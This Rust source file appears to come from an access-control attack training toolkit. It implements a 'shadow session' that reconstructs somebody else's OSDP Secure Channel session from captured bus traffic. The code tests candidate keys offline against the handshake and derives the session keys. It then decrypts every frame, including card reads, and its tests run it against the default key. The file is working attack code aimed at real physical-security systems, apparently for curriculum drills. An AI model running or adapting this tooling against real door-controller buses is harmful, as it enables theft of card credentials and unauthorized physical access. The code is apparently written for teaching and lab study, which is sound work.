//! **Reading a Secure Channel session from the outside.**
//!
//! An eavesdropper is neither the ACU nor the PD, so it cannot simply *be* a
//! [`odr_osdp::SecureChannel`]: each end of a real session only advances the
//! half of the MAC chain it is responsible for, and an observer seals nothing.
//! What an eavesdropper holds is the *whole* chain, watched from outside.
//!
//! That is what a [`ShadowSession`] is. It takes a recovered key and a capture,
//! derives the session keys from the handshake, seeds the MAC chain from the
//! server cryptogram, and then verifies and decrypts every session frame in
//! order. Every value it needs — RND.A, RND.B, the cUID, the cryptograms — was
//! in the clear on the bus before any encryption existed, which is the whole
//! point of the exercise.
//!
//! It also gives the attacker something for free: **a wrong key is detected
//! immediately**. Reconstructing the handshake under a candidate reproduces the
//! client cryptogram, and if it does not match the captured one the candidate
//! is wrong. That is the check [`crate::WeakKeyCracker`] sweeps the published
//! sample-key family with, four AES operations at a time.
//!
//! # What it deliberately does not do
//!
//! It does not *skip* frames. The MAC chain advances with every frame either
//! end accepts, so a shadow session must be fed the traffic in the order it
//! crossed or it loses sync — exactly as a real endpoint would. An attacker
//! that joined the bus late, or whose decryptor fell behind, cannot read the
//! session, and [`crate::IvReuseExploiter`] exists because of precisely that
//! gap.

use alloc::string::ToString;
use alloc::vec::Vec;

use odr_bus::{BusDir, Micros};
use odr_osdp::channel::initial_rmac;
use odr_osdp::codes::{Command, Reply};
use odr_osdp::crypto::{
    cbc_decrypt, cbc_mac, client_cryptogram, derive_session_keys, iv_from_mac, server_cryptogram,
    strip_padding, truncate_mac_to, SessionKeys, BLOCK,
};
use odr_osdp::payload::Ccrypt;
use odr_osdp::security::KeyType;
use odr_osdp::Frame;

use crate::error::{AttackError, Result};
use crate::knowledge::{ObservedFrame, ObservedHandshake};

/// One frame a shadow session managed to read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DecryptedFrame {
    /// When it crossed.
    pub t_us: Micros,
    /// Which way.
    pub dir: BusDir,
    /// The PD address.
    pub address: u8,
    /// The command or reply code — which was never secret in the first place.
    pub id: u8,
    /// The plaintext payload.
    pub plaintext: Vec<u8>,
}

/// **Somebody else's Secure Channel session, reconstructed.**
///
/// Build one with [`ShadowSession::reconstruct`], then feed it the session
/// traffic in order.
///
/// It keeps **one** MAC chain pair, exactly as the pair of real endpoints
/// jointly do: the C-MAC advances on every command and the R-MAC on every
/// reply. A single [`odr_osdp::SecureChannel`] cannot stand in for this,
/// because each end only advances the half of the chain it is responsible for —
/// an ACU's C-MAC moves when it *seals* a command, and an observer seals
/// nothing. So the verification and decryption here are written out against
/// `odr-osdp`'s own primitives rather than borrowed from one end, and they
/// compute byte for byte what the endpoints compute.
#[derive(Debug, Clone)]
pub struct ShadowSession {
    address: u8,
    key: [u8; BLOCK],
    keys: SessionKeys,
    c_mac: [u8; BLOCK],
    r_mac: [u8; BLOCK],
    mac_len: u8,
    handshake_end_us: Micros,
    opened: usize,
    failed: usize,
}

impl ShadowSession {
    /// Reconstruct a session from a candidate key and a capture.
    ///
    /// The capture must contain the four handshake frames for `address`, in
    /// order. Frames for other addresses are ignored, so a multidrop capture
    /// works as it stands.
    ///
    /// Everything it reads out of those frames — RND.A, RND.B, the cUID, the
    /// cryptograms — travelled in the clear before any encryption existed.
    ///
    /// # Errors
    /// [`AttackError::IncompleteHandshake`] when a handshake frame is missing
    /// from the capture, and [`AttackError::KeyRejected`] when the candidate
    /// key does not reproduce the cryptogram the PD sent — which is how a key
    /// is *tested* rather than assumed.
    pub fn reconstruct(
        key: [u8; BLOCK],
        _key_type: KeyType,
        mac_len: u8,
        address: u8,
        frames: &[ObservedFrame],
    ) -> Result<ShadowSession> {
        let pick = |want: &dyn Fn(&Frame) -> bool| -> Option<&ObservedFrame> {
            frames
                .iter()
                .find(|f| f.frame.address == address && want(&f.frame))
        };

        let chlng = pick(&|f: &Frame| {
            !f.is_reply && f.command_code() == Some(Command::Chlng) && f.payload.len() >= 8
        })
        .ok_or(AttackError::IncompleteHandshake {
            address: Some(address),
            missing: "CMD_CHLNG",
        })?;
        let ccrypt = pick(&|f: &Frame| f.is_reply && f.reply_code() == Some(Reply::Ccrypt)).ok_or(
            AttackError::IncompleteHandshake {
                address: Some(address),
                missing: "REPLY_CCRYPT",
            },
        )?;
        let rmac = pick(&|f: &Frame| {
            f.is_reply && f.reply_code() == Some(Reply::RmacI) && f.payload.len() >= BLOCK
        })
        .ok_or(AttackError::IncompleteHandshake {
            address: Some(address),
            missing: "REPLY_RMAC_I",
        })?;

        let body = Ccrypt::decode(&ccrypt.frame.payload)?;
        let mut rnd_a = [0u8; 8];
        rnd_a.copy_from_slice(&chlng.frame.payload[..8]);

        // Four AES operations decide whether this key is the right one.
        let keys = derive_session_keys(&key, &rnd_a);
        if client_cryptogram(&keys.s_enc, &rnd_a, &body.rnd_b) != body.client_cryptogram {
            return Err(AttackError::KeyRejected);
        }

        // The MAC chain is seeded from the server cryptogram, which both ends
        // compute and `REPLY_RMAC_I` confirms.
        let server = server_cryptogram(&keys.s_enc, &rnd_a, &body.rnd_b);
        let r_mac = initial_rmac(&keys, &server);
        if rmac.frame.payload[..BLOCK] != r_mac {
            return Err(AttackError::KeyRejected);
        }

        Ok(ShadowSession {
            address,
            key,
            keys,
            c_mac: [0u8; BLOCK],
            r_mac,
            mac_len: mac_len.clamp(1, 4),
            handshake_end_us: rmac.t_us,
            opened: 0,
            failed: 0,
        })
    }

    /// Reconstruct from a handshake already lifted out of a capture.
    pub fn from_handshake(
        key: [u8; BLOCK],
        mac_len: u8,
        handshake: &ObservedHandshake,
        frames: &[ObservedFrame],
    ) -> Result<ShadowSession> {
        ShadowSession::reconstruct(key, handshake.key_type, mac_len, handshake.address, frames)
    }

    /// Which address this session belongs to.
    pub fn address(&self) -> u8 {
        self.address
    }

    /// The key it was reconstructed under.
    pub fn key(&self) -> [u8; BLOCK] {
        self.key
    }

    /// The session keys the handshake derived. Not transmitted, and not
    /// guessable — but computable by anyone holding the SCBK and the capture.
    pub fn session_keys(&self) -> &SessionKeys {
        &self.keys
    }

    /// When the handshake finished. Session traffic starts after this.
    pub fn handshake_end_us(&self) -> Micros {
        self.handshake_end_us
    }

    /// How many frames it has read.
    pub fn opened(&self) -> usize {
        self.opened
    }

    /// How many it could not read — a frame out of chain order, a frame from
    /// another session, or a forgery.
    pub fn failed(&self) -> usize {
        self.failed
    }

    /// Read one secured frame.
    ///
    /// The IV comes from the MAC most recently computed in the **opposite**
    /// direction, which is the weakness curriculum 4.3 is about, and a
    /// successful read advances the chain in this direction. A frame that fails
    /// its MAC check advances nothing, exactly as at a real endpoint.
    pub fn open(&mut self, dir: BusDir, frame: &Frame) -> Result<Vec<u8>> {
        let scs = match frame.scs_type() {
            Some(s) if s.has_mac() => s,
            got => {
                self.failed += 1;
                return Err(AttackError::Channel(
                    odr_osdp::ChannelError::UnexpectedSecurityBlock { got },
                ));
            }
        };
        let is_cmd = dir == BusDir::AcuToPd;
        if scs.is_command_side() != is_cmd {
            self.failed += 1;
            return Err(AttackError::Channel(odr_osdp::ChannelError::WrongDirection));
        }
        let carried = match frame.mac {
            Some(m) => m,
            None => {
                self.failed += 1;
                return Err(AttackError::Channel(odr_osdp::ChannelError::MissingMac));
            }
        };

        let chain_iv = if is_cmd { self.r_mac } else { self.c_mac };
        let full = match cbc_mac(&self.keys, &chain_iv, &frame.bytes_for_mac()) {
            Some(m) => m,
            None => {
                self.failed += 1;
                return Err(AttackError::KeyRejected);
            }
        };
        let expected = truncate_mac_to(&full, self.mac_len);
        if expected != carried {
            self.failed += 1;
            return Err(AttackError::Channel(odr_osdp::ChannelError::MacMismatch {
                got: carried,
                expected,
            }));
        }

        let plaintext = if scs.is_encrypted() {
            if !frame.payload.len().is_multiple_of(BLOCK) || frame.payload.is_empty() {
                self.failed += 1;
                return Err(AttackError::Channel(
                    odr_osdp::ChannelError::NotBlockAligned {
                        len: frame.payload.len(),
                    },
                ));
            }
            let mut buf = frame.payload.clone();
            cbc_decrypt(&self.keys.s_enc, &iv_from_mac(&chain_iv), &mut buf);
            strip_padding(&buf).to_vec()
        } else {
            frame.payload.clone()
        };

        if is_cmd {
            self.c_mac = full;
        } else {
            self.r_mac = full;
        }
        self.opened += 1;
        Ok(plaintext)
    }

    /// Read every session frame in a capture, in order, skipping the handshake
    /// and anything unsecured.
    ///
    /// Frames it cannot read are left out rather than reported: an attacker's
    /// decryptor losing sync is a normal event, and the count is on
    /// [`ShadowSession::failed`].
    pub fn replay(&mut self, frames: &[ObservedFrame]) -> Vec<DecryptedFrame> {
        let mut out = Vec::new();
        for f in frames {
            if f.frame.address != self.address {
                continue;
            }
            if f.t_us <= self.handshake_end_us {
                continue;
            }
            if !f.frame.scs_type().is_some_and(|s| s.has_mac()) {
                continue;
            }
            if let Ok(plaintext) = self.open(f.dir, &f.frame) {
                out.push(DecryptedFrame {
                    t_us: f.t_us,
                    dir: f.dir,
                    address: f.frame.address,
                    id: f.frame.id,
                    plaintext,
                });
            }
        }
        out
    }

    /// Every card read in a capture, decrypted.
    ///
    /// This is curriculum drill 3.2's flag in one call: the attacker holds the
    /// session keys and has decrypted a card read, having been given only the
    /// bus traffic.
    pub fn card_reads(&mut self, frames: &[ObservedFrame]) -> Vec<(Micros, odr_wiegand::BitVec)> {
        self.replay(frames)
            .into_iter()
            .filter(|d| d.id == Reply::Raw.to_u8())
            .filter_map(|d| {
                odr_osdp::RawCardRead::decode(&d.plaintext)
                    .ok()
                    .map(|raw| (d.t_us, odr_wiegand::BitVec::from_bools(&raw.bits())))
            })
            .collect()
    }
}

/// Try a candidate key against a captured handshake without building a session.
///
/// Four AES operations. This is the inner loop of the weak-key sweep, and it is
/// entirely offline: no interaction with the bus, nothing transmitted, and no
/// way for anybody to notice it happened.
pub fn key_fits(candidate: &[u8; 16], handshake: &ObservedHandshake) -> bool {
    odr_osdp::channel::scbk_matches_handshake(
        candidate,
        &handshake.rnd_a,
        &handshake.rnd_b,
        &handshake.client_cryptogram,
    )
}

/// Lift a handshake out of a capture, if there is a complete one.
///
/// Every field comes off frames that travel before any key material exists.
pub fn handshake_in(frames: &[ObservedFrame], address: u8) -> Option<ObservedHandshake> {
    let chlng = frames.iter().find(|f| {
        f.frame.address == address
            && !f.frame.is_reply
            && f.frame.command_code() == Some(Command::Chlng)
            && f.frame.payload.len() >= 8
    })?;
    let ccrypt = frames.iter().find(|f| {
        f.frame.address == address
            && f.frame.is_reply
            && f.frame.reply_code() == Some(Reply::Ccrypt)
            && f.t_us >= chlng.t_us
    })?;
    let body = Ccrypt::decode(&ccrypt.frame.payload).ok()?;
    let mut rnd_a = [0u8; 8];
    rnd_a.copy_from_slice(&chlng.frame.payload[..8]);
    Some(ObservedHandshake {
        address,
        rnd_a,
        rnd_b: body.rnd_b,
        cuid: body.cuid,
        client_cryptogram: body.client_cryptogram,
        key_type: chlng
            .frame
            .security
            .as_ref()
            .and_then(|s| s.key_type())
            .unwrap_or(KeyType::Default),
        chlng_sequence: chlng.frame.sequence,
        t_us: chlng.t_us,
    })
}

/// Every address that answered a handshake in a capture, in the order they
/// first appeared.
pub fn handshake_addresses(frames: &[ObservedFrame]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    for f in frames {
        if !f.frame.is_reply && f.frame.command_code() == Some(Command::Chlng) {
            let a = f.frame.address;
            if !out.contains(&a) {
                out.push(a);
            }
        }
    }
    out
}

impl AttackError {
    /// A short helper for actors that need to say "there was nothing to work
    /// with", without spelling out the struct at every call site.
    pub(crate) fn nothing(attack: &'static str, detail: &str) -> AttackError {
        AttackError::Exhausted {
            attack,
            detail: detail.to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use odr_osdp::codes::Command as Cmd;
    use odr_osdp::security::{ScsType, SecurityBlock};
    use odr_osdp::{SecureChannel, SCBK_D};

    /// Run a genuine handshake and return it as a capture an attacker could
    /// have taken off the bus.
    fn captured_handshake(key: [u8; 16]) -> (Vec<ObservedFrame>, SecureChannel, SecureChannel) {
        let mut acu = SecureChannel::acu(key, KeyType::Default);
        let mut pd = SecureChannel::pd(key, KeyType::Default, [0xC0; 8]);
        let chlng = acu.challenge(0x01, 0, [0x11; 8]).unwrap();
        let ccrypt = pd.handle_challenge(&chlng, [0x22; 8]).unwrap();
        let scrypt = acu.handle_ccrypt(&ccrypt, 1).unwrap();
        let rmac = pd.handle_scrypt(&scrypt).unwrap();
        acu.handle_rmac_i(&rmac).unwrap();
        let frames = alloc::vec![
            ObservedFrame {
                t_us: 10,
                dir: BusDir::AcuToPd,
                frame: chlng
            },
            ObservedFrame {
                t_us: 20,
                dir: BusDir::PdToAcu,
                frame: ccrypt
            },
            ObservedFrame {
                t_us: 30,
                dir: BusDir::AcuToPd,
                frame: scrypt
            },
            ObservedFrame {
                t_us: 40,
                dir: BusDir::PdToAcu,
                frame: rmac
            },
        ];
        (frames, acu, pd)
    }

    #[test]
    fn a_handshake_is_liftable_out_of_a_capture() {
        let (frames, _, _) = captured_handshake(SCBK_D);
        let h = handshake_in(&frames, 0x01).expect("a complete handshake");
        assert_eq!(h.address, 0x01);
        assert_eq!(h.rnd_a, [0x11; 8]);
        assert_eq!(h.rnd_b, [0x22; 8]);
        assert_eq!(h.cuid, [0xC0; 8]);
        assert_eq!(h.key_type, KeyType::Default);
        assert_eq!(handshake_addresses(&frames), alloc::vec![0x01]);
    }

    #[test]
    fn a_candidate_key_is_tested_rather_than_assumed() {
        let (frames, _, _) = captured_handshake(SCBK_D);
        let h = handshake_in(&frames, 0x01).unwrap();
        assert!(key_fits(&SCBK_D, &h));
        assert!(!key_fits(&[0xFF; 16], &h));
        assert_eq!(
            ShadowSession::reconstruct([0xFF; 16], KeyType::Default, 4, 0x01, &frames).unwrap_err(),
            AttackError::KeyRejected
        );
    }

    #[test]
    fn a_capture_with_no_handshake_says_which_frame_is_missing() {
        let bare = alloc::vec![ObservedFrame {
            t_us: 1,
            dir: BusDir::AcuToPd,
            frame: Frame::command(0x01, 1, Cmd::Poll, alloc::vec![]),
        }];
        assert!(matches!(
            ShadowSession::reconstruct(SCBK_D, KeyType::Default, 4, 0x01, &bare),
            Err(AttackError::IncompleteHandshake {
                missing: "CMD_CHLNG",
                ..
            })
        ));
        assert_eq!(handshake_in(&bare, 0x01), None);
    }

    #[test]
    fn a_reconstructed_session_reads_the_traffic_the_endpoints_exchanged() {
        let (mut frames, mut acu, mut pd) = captured_handshake(SCBK_D);
        let mut t = 100;
        let mut expected = Vec::new();
        for i in 0..8u8 {
            let seq = (i % 3) + 1;
            let payload = alloc::vec![i; 5];
            let cmd = acu.seal(1, seq, Cmd::Mfg.to_u8(), &payload, true).unwrap();
            pd.open(&cmd).unwrap();
            frames.push(ObservedFrame {
                t_us: t,
                dir: BusDir::AcuToPd,
                frame: cmd,
            });
            expected.push(payload);
            t += 10;

            let reply = alloc::vec![i ^ 0xFF; 3];
            let rep = pd
                .seal(1, seq, Reply::MfgRep.to_u8(), &reply, true)
                .unwrap();
            acu.open(&rep).unwrap();
            frames.push(ObservedFrame {
                t_us: t,
                dir: BusDir::PdToAcu,
                frame: rep,
            });
            expected.push(reply);
            t += 10;
        }

        let mut shadow =
            ShadowSession::reconstruct(SCBK_D, KeyType::Default, 4, 0x01, &frames).unwrap();
        let read: Vec<Vec<u8>> = shadow
            .replay(&frames)
            .into_iter()
            .map(|d| d.plaintext)
            .collect();
        assert_eq!(read, expected, "every frame, in both directions");
        assert_eq!(shadow.failed(), 0);
        assert_eq!(shadow.address(), 0x01);
        assert_eq!(shadow.key(), SCBK_D);
        assert_eq!(shadow.handshake_end_us(), 40);
    }

    /// **The weakness, from the decryptor's side.**
    ///
    /// A command's IV is the R-MAC, which only moves when a *reply* is
    /// processed — so a shadow session shown the same command twice reads it
    /// twice, and that is the same fact curriculum 4.3 exploits from the
    /// outside. Once a reply goes through, the chain moves and the repeat dies.
    #[test]
    fn a_repeated_command_reads_twice_until_a_reply_moves_the_chain() {
        let (mut frames, mut acu, mut pd) = captured_handshake(SCBK_D);
        let cmd = acu
            .seal(1, 1, Cmd::Mfg.to_u8(), b"open sesame", true)
            .unwrap();
        pd.open(&cmd).unwrap();
        frames.push(ObservedFrame {
            t_us: 100,
            dir: BusDir::AcuToPd,
            frame: cmd.clone(),
        });
        let rep = pd.seal(1, 1, Reply::Ack.to_u8(), &[], false).unwrap();
        frames.push(ObservedFrame {
            t_us: 110,
            dir: BusDir::PdToAcu,
            frame: rep.clone(),
        });

        let mut shadow =
            ShadowSession::reconstruct(SCBK_D, KeyType::Default, 4, 0x01, &frames).unwrap();
        assert_eq!(shadow.open(BusDir::AcuToPd, &cmd).unwrap(), b"open sesame");
        assert_eq!(
            shadow.open(BusDir::AcuToPd, &cmd).unwrap(),
            b"open sesame",
            "the command chain has not moved, so the repeat still verifies"
        );

        // A reply moves the R-MAC, and the repeat is then out of reach.
        shadow.open(BusDir::PdToAcu, &rep).unwrap();
        assert!(shadow.open(BusDir::AcuToPd, &cmd).is_err());
        assert_eq!(shadow.failed(), 1);
    }

    #[test]
    fn an_unsecured_frame_is_refused_rather_than_read() {
        let (frames, _, _) = captured_handshake(SCBK_D);
        let mut shadow =
            ShadowSession::reconstruct(SCBK_D, KeyType::Default, 4, 0x01, &frames).unwrap();
        let bare = Frame::command(0x01, 1, Cmd::Poll, alloc::vec![]);
        assert!(shadow.open(BusDir::AcuToPd, &bare).is_err());

        // And a session frame travelling the wrong way.
        let mut wrong = Frame::command(0x01, 1, Cmd::Poll, alloc::vec![]);
        wrong.security = Some(SecurityBlock::new(ScsType::CmdMacOnly));
        wrong.mac = Some([0; 4]);
        assert!(shadow.open(BusDir::PdToAcu, &wrong).is_err());
    }

    #[test]
    fn a_shortened_mac_is_verified_at_the_width_the_bus_uses() {
        let mut acu = SecureChannel::acu(SCBK_D, KeyType::Default).with_mac_len(1);
        let mut pd = SecureChannel::pd(SCBK_D, KeyType::Default, [0xC0; 8]).with_mac_len(1);
        let chlng = acu.challenge(0x01, 0, [0x11; 8]).unwrap();
        let ccrypt = pd.handle_challenge(&chlng, [0x22; 8]).unwrap();
        let scrypt = acu.handle_ccrypt(&ccrypt, 1).unwrap();
        let rmac = pd.handle_scrypt(&scrypt).unwrap();
        acu.handle_rmac_i(&rmac).unwrap();
        let cmd = acu.seal(1, 1, Cmd::Mfg.to_u8(), b"hello", true).unwrap();
        let frames = alloc::vec![
            ObservedFrame {
                t_us: 10,
                dir: BusDir::AcuToPd,
                frame: chlng
            },
            ObservedFrame {
                t_us: 20,
                dir: BusDir::PdToAcu,
                frame: ccrypt
            },
            ObservedFrame {
                t_us: 30,
                dir: BusDir::AcuToPd,
                frame: scrypt
            },
            ObservedFrame {
                t_us: 40,
                dir: BusDir::PdToAcu,
                frame: rmac
            },
            ObservedFrame {
                t_us: 50,
                dir: BusDir::AcuToPd,
                frame: cmd
            },
        ];
        let mut narrow =
            ShadowSession::reconstruct(SCBK_D, KeyType::Default, 1, 0x01, &frames).unwrap();
        assert_eq!(narrow.replay(&frames).len(), 1);

        // The same capture read as if the MAC were full width fails, which is
        // why the width is something an attacker measures.
        let mut wide =
            ShadowSession::reconstruct(SCBK_D, KeyType::Default, 4, 0x01, &frames).unwrap();
        assert_eq!(wide.replay(&frames).len(), 0);
    }
}
